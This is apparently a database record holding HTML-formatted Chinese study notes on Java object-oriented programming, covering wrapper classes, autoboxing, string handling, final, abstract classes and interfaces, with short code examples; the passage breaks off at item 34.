	(89, '面向对象（下）', 'Cassie', '<p style="margin-left:24px;line-height:31px"><span style="font-family:Calibri;font-size:19px">1.&nbsp;</span><span style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">自动装箱与自动拆箱：</span></span></p><p style="margin-left:24px;text-indent:0;line-height:31px"><span style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">自动装箱：将基本数据类型变量</span></span><span style=";font-family:Calibri;font-size:19px">—</span><span style=";font-family:宋体;font-size:19px">&gt;<span style="font-family:宋体">赋给</span></span><span style=";font-family:宋体;color:rgb(255,0,0);font-size:19px"><span style="font-family:宋体">对应</span></span><span style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">包装类或</span>Object<span style="font-family:宋体">变量</span></span></p><p style="margin-left:24px;text-indent:0;line-height:31px"><span style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">（例如：</span>Integer &nbsp;aa=5;//Object &nbsp;bb=true;<span style="font-family:宋体">）</span></span></p><p style="margin-left:24px;text-indent:0;line-height:31px"><span style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">自动拆箱：直接把包装类对象赋给一个</span></span><span style=";font-family:宋体;color:rgb(255,0,0);font-size:19px"><span style="font-family:宋体">对应</span></span><span style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">的基本数据类型变量</span></span></p><p style="margin-left:24px;text-indent:9px;line-height:31px"><span style=";font-family:宋体;font-size:19px">(<span style="font-family:宋体">例如：</span><span style="font-family:Calibri">int &nbsp;cc=aa;)</span></span></p><p style="margin-left:24px;line-height:31px"><span style="font-family:Calibri;font-size:19px">2.&nbsp;</span><span style=";font-family:宋体;font-size:19px">8<span style="font-family:宋体">种基本数据类型与包装类的对应关系：</span></span></p><p style="margin-left:24px;text-indent:0;line-height:31px"><span style=";font-family:Calibri;font-size:19px"><span style="font-family:宋体">特殊</span></span><span style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">：</span></span><span style=";font-family:Calibri;font-size:19px">i</span><span style=";font-family:宋体;font-size:19px">nt<span style="font-family:宋体">——</span><span style="font-family:Calibri">Integer &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;char</span><span style="font-family:宋体">——</span><span style="font-family:Calibri">Character</span></span></p><p style="margin-left:24px;text-indent:0;line-height:31px"><span style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">规律：其余</span>6<span style="font-family:宋体">种基本数据类型</span></span><span style=";font-family:宋体;color:rgb(255,0,0);font-size:19px"><span style="font-family:宋体">首字母</span></span><span style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">大写即可</span></span></p><p style="margin-left:24px;line-height:31px"><span style="font-family:Calibri;font-size:19px">3.&nbsp;</span><span style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">把字符串类型的值转换为基本类型的两种方式：</span></span></p><p style="margin-left:48px;line-height:31px"><span style="font-family:Calibri;font-size:19px">(1)&nbsp;</span><span style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">利用包装类提供的</span></span><span style=";font-family:宋体;color:rgb(255,0,0);font-size:19px">parseXxx(String s)</span><span style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">静态方法</span></span><span style=";font-family:宋体;font-size:19px;background:rgb(255,255,0);background:rgb(255,255,0)"><span style="font-family:宋体">（除</span>Character<span style="font-family:宋体">外）</span></span></p><p style="margin-left:48px;line-height:31px"><span style="font-family:Calibri;font-size:19px">(2)&nbsp;</span><span style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">利用包装类提供的</span></span><span style=";font-family:宋体;color:rgb(255,0,0);font-size:19px">Xxx(String s)</span><span style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">构造器</span></span></p><p style="margin-left:20px;text-indent:28px;line-height:31px"><span style=";font-family:宋体;font-size:19px">(<span style="font-family:宋体">例如：</span></span></p><p style="margin-left:34px;text-indent:28px;line-height:31px"><span style=";font-family:宋体;font-size:19px">String &nbsp;intStr=</span><span style=";font-family:Calibri;font-size:19px">”</span><span style=";font-family:宋体;font-size:19px">123</span><span style=";font-family:Calibri;font-size:19px">”</span><span style=";font-family:宋体;font-size:19px">;</span></p><p style="margin-left:62px;text-indent:0;line-height:31px"><span style=";font-family:宋体;font-size:19px">int &nbsp;it1=Integer.parseInt(intStr);//parseXxx(String s)<span style="font-family:宋体">静态方法</span></span></p><p style="margin-left:62px;text-indent:0;line-height:31px"><span style=";font-family:宋体;font-size:19px">int &nbsp;it2=new Integer(intStr);//Xxx(String s)<span style="font-family:宋体">构造器</span></span></p><p style="margin-left:48px;text-indent:0;line-height:31px"><span style=";font-family:宋体;font-size:19px">)</span></p><p style="margin-left:24px;line-height:31px"><span style="font-family:Calibri;font-size:19px">4.&nbsp;</span><span style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">将基本类型变量转成字符串：</span></span></p><p style="margin-left:48px;line-height:31px"><span style="font-family:Calibri;font-size:19px">(1)&nbsp;</span><span style=";font-family:宋体;font-size:19px">String<span style="font-family:宋体">类提供了多个重载</span></span><span style=";font-family:宋体;color:rgb(255,0,0);font-size:19px">valueOf()</span><span style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">方法</span>:</span></p><p style="margin-left:52px;text-indent:4px;line-height:31px"><span style=";font-family:宋体;font-size:19px">(<span style="font-family:宋体">例如：</span><span style="font-family:Calibri">String &nbsp;f=String.valueOf(2.345f); //</span><span style="font-family:宋体">把</span><span style="font-family:Calibri">float</span><span style="font-family:宋体">—</span><span style="font-family:Calibri">&gt;String </span></span></p><p style="margin-left:52px;text-indent:4px;line-height:31px"><span style=";font-family:宋体;font-size:19px">//<span style="font-family:宋体">把一个</span><span style="font-family:Calibri">boolean</span><span style="font-family:宋体">变量转变为</span><span style="font-family:Calibri">String</span><span style="font-family:宋体">变量</span></span></p><p style="margin-left:52px;text-indent:4px;line-height:31px"><span style=";font-family:宋体;font-size:19px">String &nbsp;boolStr=String.valueOf(true);</span></p><p style="margin-left:52px;text-indent:4px;line-height:31px"><span style=";font-family:宋体;font-size:19px">System.out.println(boolStr.toUpperCase());</span></p><p style="margin-left:52px;text-indent:4px;line-height:31px"><span style=";font-family:宋体;font-size:19px">&nbsp;)</span></p><p style="margin-left:48px;line-height:31px"><span style="font-family:Calibri;font-size:19px">(2)&nbsp;</span><span style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">将基本类型变量和</span></span><span style=";font-family:Calibri;font-size:19px">””</span><span style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">进行连接运算，系统会自动把基本类型变量转换成字符串：</span></span></p><p style="margin-left:48px;text-indent:0;line-height:31px"><span style=";font-family:宋体;font-size:19px">(<span style="font-family:宋体">例如：</span><span style="font-family:Calibri">String &nbsp;intStr=5+</span></span><span style=";font-family:Calibri;font-size:19px">””</span><span style=";font-family:宋体;font-size:19px">; &nbsp;&nbsp;&nbsp;)</span></p><p style="margin-left:24px;line-height:31px"><span style="font-family:Calibri;font-size:19px">5.&nbsp;</span><span style=";font-family:宋体;font-size:19px">Integer<span style="font-family:宋体">的自动装箱，</span><span style="font-family:Calibri">-128~127</span><span style="font-family:宋体">系统有缓存，在这个区间的数值</span><span style="font-family:Calibri">Integer</span><span style="font-family:宋体">对象是同一个对象，超出这个范围，例如</span><span style="font-family:Calibri">128</span><span style="font-family:宋体">，将会重新创建一个</span><span style="font-family:Calibri">Integer</span><span style="font-family:宋体">实例，此时两个</span><span style="font-family:Calibri">Integer</span><span style="font-family:宋体">对象不是同一个对象。</span></span></p><p style="margin-left:24px;text-indent:0;line-height:31px"><span style=";font-family:宋体;font-size:19px">(<span style="font-family:宋体">例如：</span></span></p><p style="margin-left:24px;text-indent:0;line-height:31px"><span style=";font-family:宋体;font-size:19px">Integer &nbsp;ina=2;</span></p><p style="margin-left:24px;text-indent:0;line-height:31px"><span style=";font-family:宋体;font-size:19px">Integer &nbsp;inb=2;</span></p><p style="margin-left:24px;text-indent:0;line-height:31px"><span style=";font-family:宋体;font-size:19px">System.out.println(ina==inb); &nbsp;&nbsp;//<span style="font-family:宋体">输出</span><span style="font-family:Calibri">true</span></span></p><p style="margin-left:24px;text-indent:0;line-height:31px"><span style=";font-family:宋体;font-size:19px">Integer &nbsp;biga=128;</span></p><p style="margin-left:24px;text-indent:0;line-height:31px"><span style=";font-family:宋体;font-size:19px">Integer &nbsp;bigb=128;</span></p><p style="margin-left:24px;text-indent:0;line-height:31px"><span style=";font-family:宋体;font-size:19px">System.out.println(biga==bigb); &nbsp;&nbsp;//<span style="font-family:宋体">输出</span><span style="font-family:Calibri">false</span></span></p><p style="margin-left:24px;text-indent:0;line-height:31px"><span style=";font-family:宋体;font-size:19px">)</span></p><p style="margin-left:24px;line-height:31px"><span style="font-family:Calibri;font-size:19px">6.&nbsp;</span><span style=";font-family:Calibri;font-size:19px">C</span><span style=";font-family:宋体;font-size:19px">ompare(xxx val1,xxx val2)</span></p><p style="margin-left:24px;text-indent:0;line-height:31px"><span style=";font-family:宋体;font-size:19px">val1&gt;val2:<span style="font-family:宋体">输出</span><span style="font-family:Calibri">1</span></span></p><p style="margin-left:24px;text-indent:0;line-height:31px"><span style=";font-family:宋体;font-size:19px">val1=val2:<span style="font-family:宋体">输出</span><span style="font-family:Calibri">0</span></span></p><p style="margin-left:24px;text-indent:0;line-height:31px"><span style=";font-family:宋体;font-size:19px">val1&lt;val2:<span style="font-family:宋体">输出</span><span style="font-family:Calibri">-1</span></span></p><p style="margin-left:24px;line-height:31px"><span style="font-family:Calibri;font-size:19px">7.&nbsp;</span><span style=";font-family:Calibri;font-size:19px">toString</span><span style=";font-family:宋体;font-size:19px">()<span style="font-family:宋体">方法是</span><span style="font-family:Calibri">Object</span><span style="font-family:宋体">的实例方法，默认调用的</span><span style="font-family:Calibri">toString()</span><span style="font-family:宋体">方法返回的是：类名</span><span style="font-family:Calibri">+@+</span><span style="font-family:宋体">哈希算法值，所以，需要重写</span><span style="font-family:Calibri">toString()</span><span style="font-family:宋体">方法，让它打印你所需要打印的属性值。</span></span></p><p style="margin-left:24px;line-height:31px"><span style="font-family:Calibri;font-size:19px">8.&nbsp;</span><span style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">判断两个变量是否相等的两个方法：</span></span><span style=";font-family:Calibri;font-size:19px">“</span><span style=";font-family:宋体;font-size:19px">==</span><span style=";font-family:Calibri;font-size:19px">”</span><span style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">和</span>equals()<span style="font-family:宋体">方法：</span></span></p><p style="margin-left:48px;line-height:31px"><span style="font-family:Calibri;font-size:19px">(1)&nbsp;</span><span style=";font-family:Calibri;font-size:19px">“</span><span style=";font-family:宋体;font-size:19px">==</span><span style=";font-family:Calibri;font-size:19px">”</span><span style=";font-family:宋体;font-size:19px">: </span></p><p style="margin-left:48px;text-indent:0;line-height:31px"><span style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">基本类型变量：都是数值类型，且两变量值相等，返回</span>true<span style="font-family:宋体">。</span></span></p><p style="margin-left:48px;text-indent:0;line-height:31px"><span style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">引用类型变量：两个引用指向同一个对象时，返回</span>true<span style="font-family:宋体">，否则返回</span><span style="font-family:Calibri">false</span><span style="font-family:宋体">。（</span></span><span style="text-decoration:underline;"><span style=";font-family:宋体;text-underline:rgb(255,0,0) wave;font-size:19px">==<span style="font-family:宋体">不可用于比较没有父子关系的两个对象</span></span></span><span style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">）</span></span></p><p style="margin-left:48px;line-height:31px"><span style="font-family:Calibri;font-size:19px">(2)&nbsp;</span><span style=";font-family:Calibri;font-size:19px">e</span><span style=";font-family:宋体;font-size:19px">quals()<span style="font-family:宋体">方法</span><span style="font-family:Calibri">: </span><span style="font-family:宋体">没有重写的</span><span style="font-family:Calibri">equals()</span><span style="font-family:宋体">方法与“</span><span style="font-family:Calibri">==</span><span style="font-family:宋体">”无异，重写后只要对象的内容相同即可返回</span><span style="font-family:Calibri">true</span><span style="font-family:宋体">。</span></span></p><p style="margin-left:24px;line-height:31px"><span style="font-family:Calibri;font-size:19px">9.&nbsp;</span><span style=";font-family:Calibri;font-size:19px">“</span><span style=";font-family:宋体;font-size:19px">hello</span><span style=";font-family:Calibri;font-size:19px">”</span><span style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">直接量与</span>new String(</span><span style=";font-family:Calibri;font-size:19px">“</span><span style=";font-family:宋体;font-size:19px">hello</span><span style=";font-family:Calibri;font-size:19px">”</span><span style=";font-family:宋体;font-size:19px">)<span style="font-family:宋体">的区别：</span></span></p><p style="margin-left:48px;line-height:31px"><span style="font-family:Calibri;font-size:19px">(1)&nbsp;</span><span style=";font-family:Calibri;font-size:19px">“</span><span style=";font-family:宋体;font-size:19px">hello</span><span style=";font-family:Calibri;font-size:19px">”</span><span style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">直接量：可以在编译的时候就计算出来的字符串，存放在常量池里。</span></span></p><p style="margin-left:48px;line-height:31px"><span style="font-family:Calibri;font-size:19px">(2)&nbsp;</span><span style=";font-family:Calibri;font-size:19px">new</span><span style=";font-family:宋体;font-size:19px">&nbsp;String(</span><span style=";font-family:Calibri;font-size:19px">“</span><span style=";font-family:宋体;font-size:19px">hello</span><span style=";font-family:Calibri;font-size:19px">”</span><span style=";font-family:宋体;font-size:19px">): </span><span style=";font-family:Calibri;font-size:19px">“</span><span style=";font-family:宋体;font-size:19px">hello</span><span style=";font-family:Calibri;font-size:19px">”</span><span style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">会先被放到常量池中管理，再调用</span>String<span style="font-family:宋体">类的构造器创建一个新的</span><span style="font-family:Calibri">String</span><span style="font-family:宋体">对象，放在堆内存中。</span></span><span style=";font-family:Calibri;font-size:19px">new</span><span style=";font-family:宋体;font-size:19px">&nbsp;String(</span><span style=";font-family:Calibri;font-size:19px">“</span><span style=";font-family:宋体;font-size:19px">hello</span><span style=";font-family:Calibri;font-size:19px">”</span><span style=";font-family:宋体;font-size:19px">)<span style="font-family:宋体">一共产生了两个字符串对象。</span></span></p><p style="margin-left:24px;line-height:31px"><span style="font-family:Calibri;font-size:19px">10.&nbsp;</span><span style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">单例类：只能创建一个实例的类。实现：创建一个类变量用来缓存实例对象，若已经创建实例对象，则直接返回该变量；若未创建实例对象，则直接创建实例对象。</span></span></p><p style="margin-left:24px;text-indent:0;line-height:31px"><span style=";font-family:宋体;font-size:19px">(<span style="font-family:宋体">例如：</span><span style="font-family:Calibri">private &nbsp;static &nbsp;Singleton &nbsp;instance;</span></span></p><p style="margin-left:24px;text-indent:0;line-height:31px"><span style=";font-family:Calibri;font-size:19px">P</span><span style=";font-family:宋体;font-size:19px">ublic &nbsp;static &nbsp;Singleton &nbsp;getInstance(){</span></p><p style="margin-left:24px;text-indent:0;line-height:31px"><span style=";font-family:Calibri;font-size:19px">I</span><span style=";font-family:宋体;font-size:19px">f (instance==null){</span></p><p style="margin-left:24px;text-indent:0;line-height:31px"><span style=";font-family:Calibri;font-size:19px">I</span><span style=";font-family:宋体;font-size:19px">nstance=new &nbsp;Singleton();</span></p><p style="margin-left:24px;text-indent:0;line-height:31px"><span style=";font-family:宋体;font-size:19px">}</span></p><p style="margin-left:24px;text-indent:0;line-height:31px"><span style=";font-family:宋体;font-size:19px">return instance;</span></p><p style="margin-left:24px;text-indent:0;line-height:31px"><span style=";font-family:宋体;font-size:19px">}</span></p><p style="margin-left:24px;line-height:31px"><span style="font-family:Calibri;font-size:19px">11.&nbsp;</span><span style=";font-family:宋体;font-size:19px">&nbsp;</span><span style=";font-family:Calibri;font-size:19px">F</span><span style=";font-family:宋体;font-size:19px">inal<span style="font-family:宋体">修饰的类变量、实例变量指定初始值的地方：</span></span></p><p style="margin-left:48px;line-height:31px"><span style="font-family:Calibri;font-size:19px">(1)&nbsp;</span><span style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">类变量（</span>2<span style="font-family:宋体">个地方）：静态初始化块和声明该类变量的时候指定</span></span></p><p style="margin-left:48px;line-height:31px"><span style="font-family:Calibri;font-size:19px">(2)&nbsp;</span><span style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">实例变量（</span>3<span style="font-family:宋体">个地方）：非静态初始化块、声明该实例变量、构造器。</span></span></p><p style="margin-left:24px;line-height:31px"><span style="font-family:Calibri;font-size:19px">12.&nbsp;</span><span style=";font-family:Calibri;font-size:19px">F</span><span style=";font-family:宋体;font-size:19px">inal<span style="font-family:宋体">修饰的基本类型变量不可被改变，获得初始值之后不能被重新赋值。</span><span style="font-family:Calibri">(</span></span><span style=";font-family:宋体;color:rgb(255,0,0);font-size:19px"><span style="font-family:宋体">只能赋值一次</span></span><span style=";font-family:宋体;font-size:19px">)</span><span style=";font-family:Calibri;font-size:19px">F</span><span style=";font-family:宋体;font-size:19px">inal<span style="font-family:宋体">变量必须由程序猿显示初始化，系统不会对</span><span style="font-family:Calibri">final</span><span style="font-family:宋体">成员进行隐式初始化。</span></span><span style=";font-family:Calibri;color:rgb(255,0,0);font-size:19px">F</span><span style=";font-family:宋体;color:rgb(255,0,0);font-size:19px">inal<span style="font-family:宋体">修饰的形参不能被赋值。</span></span></p><p style="margin-left:24px;line-height:31px"><span style="font-family:Calibri;font-size:19px">13.&nbsp;</span><span style=";font-family:Calibri;font-size:19px">final<span style="font-family:宋体">修饰的</span></span><span style=";font-family:Calibri;color:rgb(255,0,0);font-size:19px"><span style="font-family:宋体">引用类型变量</span></span><span style=";font-family:Calibri;font-size:19px"><span style="font-family:宋体">中的栈内存的地址不可更改</span></span><span style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">，</span></span><span style=";font-family:Calibri;font-size:19px"><span style="font-family:宋体">但对象可以改变</span></span><span style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">。</span></span></p><p style="margin-left:24px;line-height:31px"><span style="font-family:Calibri;font-size:19px">14.&nbsp;</span><span style=";font-family:宋体;font-size:19px">final<span style="font-family:宋体">变量可以不是变量，而是直接量的条件：</span><span style="font-family:Calibri">final</span><span style="font-family:宋体">修饰变量时用直接量初始化赋值。即：</span><span style="font-family:Calibri">final &nbsp;int a=5; //a</span><span style="font-family:宋体">可以看成直接量</span><span style="font-family:Calibri">5</span></span></p><p style="margin-left:24px;text-indent:0;line-height:31px"><span style=";font-family:宋体;font-size:19px">final<span style="font-family:宋体">变量的本质就是</span></span><span style=";font-family:Calibri;font-size:19px">”</span><span style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">宏变量</span></span><span style=";font-family:Calibri;font-size:19px">”</span><span style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">，编译器会把所有用到该变量的地方直接替换成该变量的值。</span></span></p><p style="margin-left:24px;text-indent:0;line-height:31px"><span style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">有</span>final<span style="font-family:宋体">变量赋值时，被赋的是基本算术表达式或字符串连接运算，没有访问普通变量，也将</span><span style="font-family:Calibri">final</span><span style="font-family:宋体">变量当成</span></span><span style=";font-family:Calibri;font-size:19px">”</span><span style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">宏变量</span></span><span style=";font-family:Calibri;font-size:19px">”</span><span style=";font-family:宋体;font-size:19px">.</span></p><p style="margin-left:24px;text-indent:0;line-height:31px"><span style=";font-family:宋体;font-size:19px">(<span style="font-family:宋体">例如：</span><span style="font-family:Calibri">final int a=5+2;)</span></span></p><p style="margin-left:24px;line-height:31px"><span style="font-family:Calibri;font-size:19px">15.&nbsp;</span><span style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">父类中用</span>private<span style="font-family:宋体">修饰的方法，子类中即使方法名、参数列表、返回值类型都相同，也不是方法重写，而是重新定义了一个方法。</span></span></p><p style="margin-left:24px;line-height:31px"><span style="font-family:Calibri;font-size:19px">16.&nbsp;</span><span style=";font-family:Calibri;font-size:19px">F</span><span style=";font-family:宋体;font-size:19px">inal<span style="font-family:宋体">修饰的方法不能被重写，但是可以被重载。</span></span></p><p style="margin-left:24px;line-height:31px"><span style="font-family:Calibri;font-size:19px">17.&nbsp;</span><span style=";font-family:Calibri;font-size:19px">F</span><span style=";font-family:宋体;font-size:19px">inal<span style="font-family:宋体">修饰的类不可以有子类，即有</span><span style="font-family:Calibri">final</span><span style="font-family:宋体">修饰的类不能被继承。</span></span></p><p style="margin-left:24px;line-height:31px"><span style="font-family:Calibri;font-size:19px">18.&nbsp;</span><span style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">抽象类和抽象方法用</span>abstract<span style="font-family:宋体">修饰，有抽象方法的类只能是抽象类，抽象类可以没有抽象方法。抽象方法不能有方法体，抽象类不能实例化。</span></span></p><p style="margin-left:24px;line-height:31px"><span style="font-family:Calibri;font-size:19px">19.&nbsp;</span><span style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">具有抽象方法的类三种情况：</span></span></p><p style="margin-left:48px;line-height:31px"><span style="font-family:Calibri;font-size:19px">(1)&nbsp;</span><span style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">直接定义一个抽象方法。</span></span></p><p style="margin-left:48px;line-height:31px"><span style="font-family:Calibri;font-size:19px">(2)&nbsp;</span><span style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">继承抽象父类但没有完全实现父类的抽象方法。</span></span></p><p style="margin-left:48px;line-height:31px"><span style="font-family:Calibri;font-size:19px">(3)&nbsp;</span><span style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">实现一个接口但没有完全实现接口的抽象方法。</span></span></p><p style="margin-left:24px;line-height:31px"><span style="font-family:Calibri;font-size:19px">20.&nbsp;</span><span style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">抽象方法和空方法体：</span></span></p><p style="margin-left:48px;line-height:31px"><span style="font-family:Calibri;font-size:19px">(1)&nbsp;</span><span style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">抽象方法：</span>public abstract void test();</span></p><p style="margin-left:48px;line-height:31px"><span style="font-family:Calibri;font-size:19px">(2)&nbsp;</span><span style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">空方法体：</span>public void test(){};</span></p><p style="margin-left:24px;line-height:31px"><span style="font-family:Calibri;font-size:19px">21.&nbsp;</span><span style=";font-family:Calibri;font-size:19px">A</span><span style=";font-family:宋体;font-size:19px">bstract<span style="font-family:宋体">和</span><span style="font-family:Calibri">final</span><span style="font-family:宋体">修饰类的比较：</span></span></p><p style="margin-left:48px;line-height:31px"><span style="font-family:Calibri;font-size:19px">(1)&nbsp;</span><span style=";font-family:Calibri;font-size:19px">A</span><span style=";font-family:宋体;font-size:19px">bstract<span style="font-family:宋体">修饰类，只能被继承，不能实例化，</span><span style="font-family:Calibri">abstract</span><span style="font-family:宋体">修饰方法必须在子类里面重写。</span></span></p><p style="margin-left:48px;line-height:31px"><span style="font-family:Calibri;font-size:19px">(2)&nbsp;</span><span style=";font-family:Calibri;font-size:19px">F</span><span style=";font-family:宋体;font-size:19px">inal<span style="font-family:宋体">修饰类，不能被继承，</span><span style="font-family:Calibri">final</span><span style="font-family:宋体">修饰方法不能被重写。</span></span></p><p style="margin-left:48px;line-height:31px"><span style="font-family:Calibri;font-size:19px">(3)&nbsp;</span><span style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">所以，</span></span><span style=";font-family:宋体;color:rgb(255,0,0);font-size:19px">abstract<span style="font-family:宋体">和</span><span style="font-family:Calibri">final</span><span style="font-family:宋体">不能同时使用。</span></span></p><p style="margin-left:24px;line-height:31px"><span style="font-family:Calibri;font-size:19px">22.&nbsp;</span><span style=";font-family:Calibri;font-size:19px">A</span><span style=";font-family:宋体;font-size:19px">bstract<span style="font-family:宋体">不能修饰</span></span><span style=";font-family:宋体;color:rgb(255,0,0);font-size:19px"><span style="font-family:宋体">成员变量</span></span><span style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">，不能修饰</span></span><span style=";font-family:宋体;color:rgb(255,0,0);font-size:19px"><span style="font-family:宋体">局部变量</span></span><span style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">，不能修饰</span></span><span style=";font-family:宋体;color:rgb(255,0,0);font-size:19px"><span style="font-family:宋体">构造器</span></span><span style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">。</span></span></p><p style="margin-left:24px;line-height:31px"><span style="font-family:Calibri;font-size:19px">23.&nbsp;</span><span style=";font-family:Calibri;font-size:19px">S</span><span style=";font-family:宋体;font-size:19px">tatic<span style="font-family:宋体">和</span><span style="font-family:Calibri">abstract</span><span style="font-family:宋体">不能同时修饰一个方法</span><span style="font-family:Calibri">(static</span><span style="font-family:宋体">修饰的类方法可以通过类来调用，若是用</span><span style="font-family:Calibri">abstract</span><span style="font-family:宋体">修饰就没有方法体了</span><span style="font-family:Calibri">)</span><span style="font-family:宋体">，但是可以同时修饰内部类。</span></span></p><p style="margin-left:24px;line-height:31px"><span style="font-family:Calibri;font-size:19px">24.&nbsp;</span><span style=";font-family:宋体;font-size:19px">abstract<span style="font-family:宋体">方法不能定义为</span><span style="font-family:Calibri">private</span><span style="font-family:宋体">权限</span><span style="font-family:Calibri">(</span><span style="font-family:宋体">因为</span><span style="font-family:Calibri">abstract</span><span style="font-family:宋体">方法要被子类继承</span><span style="font-family:Calibri">)</span><span style="font-family:宋体">，即</span><span style="font-family:Calibri">private</span><span style="font-family:宋体">和</span><span style="font-family:Calibri">abstract</span><span style="font-family:宋体">不能同时修饰方法。</span></span></p><p style="margin-left:24px;line-height:31px"><span style="font-family:Calibri;font-size:19px">25.&nbsp;</span><span style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">一个接口可以有多个直接父接口，但接口只能继承接口，不能继承类。</span></span></p><p style="margin-left:24px;line-height:31px"><span style="font-family:Calibri;font-size:19px">26.&nbsp;</span><span style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">接口里不能包含</span></span><span style=";font-family:宋体;color:rgb(255,0,0);font-size:19px"><span style="font-family:宋体">构造器和初始化块</span></span><span style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">，因而</span></span><span style=";font-family:宋体;font-size:19px;background:rgb(255,255,0);background:rgb(255,255,0)"><span style="font-family:宋体">接口里定义的成员变量只能在定义时指定默认值</span></span><span style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">。</span></span></p><p style="margin-left:24px;line-height:31px"><span style="font-family:Calibri;font-size:19px">27.&nbsp;</span><span style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">接口里的成员变量只能是静态常量</span>(<span style="font-family:宋体">使用</span></span><span style=";font-family:宋体;color:rgb(255,0,0);font-size:19px">public static final</span><span style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">修饰，若没写则系统自动增加，例如：</span>public static final int a=4;)<span style="font-family:宋体">，方法只能是抽象实例方法、类方法或默认方法，内部类</span><span style="font-family:Calibri">(</span><span style="font-family:宋体">包含内部接口、枚举</span><span style="font-family:Calibri">)</span><span style="font-family:宋体">。接口里的所有成员，包括常量、方法、内部类和内部枚举都是</span></span><span style=";font-family:宋体;color:rgb(255,0,0);font-size:19px">public</span><span style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">访问权限。</span></span></p><p style="margin-left:24px;line-height:31px"><span style="font-family:Calibri;font-size:19px">28.&nbsp;</span><span style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">接口里的普通方法要用</span>public abstract<span style="font-family:宋体">修饰（没写系统自动加）；接口里的普通方法不能有方法实现（方法体），但类方法、默认方法必须有方法实现（方法体）。</span></span></p><p style="margin-left:24px;line-height:31px"><span style="font-family:Calibri;color:rgb(255,0,0);font-size:19px">29.&nbsp;</span><span style=";font-family:宋体;color:rgb(255,0,0);font-size:19px"><span style="font-family:宋体">默认方法</span></span><span style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">必须使用</span>default<span style="font-family:宋体">修饰，不能使用</span><span style="font-family:Calibri">static</span><span style="font-family:宋体">修饰，所以不能使用接口来调用默认方法，使用</span></span><span style="text-decoration:underline;"><span style=";font-family:宋体;text-underline:rgb(255,0,0) wave;font-size:19px"><span style="font-family:宋体">接口的实现类的实例</span></span></span><span style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">来调用默认方法。</span></span></p><p style="margin-left:24px;line-height:31px"><span style="font-family:Calibri;font-size:19px">30.&nbsp;</span><span style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">接口定义</span></span><span style=";font-family:宋体;color:rgb(255,0,0);font-size:19px"><span style="font-family:宋体">类方法</span></span><span style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">，必须使用</span>static<span style="font-family:宋体">修饰，不能使用</span><span style="font-family:Calibri">default</span><span style="font-family:宋体">修饰。类方法可以直接使用接口来调用。</span></span></p><p style="margin-left:24px;line-height:31px"><span style="font-family:Calibri;font-size:19px">31.&nbsp;</span><span style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">接口可以多继承，中间用逗号隔开。</span></span></p><p style="margin-left:24px;line-height:31px"><span style="font-family:Calibri;font-size:19px">32.&nbsp;</span><span style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">接口不能创建实例，但可以用于引用类型变量，引用类型变量必须引用到它实现类的对象。</span></span></p><p style="margin-left:24px;line-height:31px"><span style="font-family:Calibri;font-size:19px">33.&nbsp;</span><span style=";font-family:宋体;font-size:19px"><span style="font-family:宋体">接口继承用</span>extends<span style="font-family:宋体">，实现用</span><span style="font-family:Calibri">implements</span><span style="font-family:宋体">。一个类可以继承一个父类，同时实现多个接口，</span><span style="font-family:Calibri">implements</span><span style="font-family:宋体">部分必须放在</span><span style="font-family:Calibri">extends</span><span style="font-family:宋体">后面。</span></span></p><p style="margin-left:24px;line-height:31px"><span style="font-family:Calibri;font-size:19px">34.&nbsp;</span><span 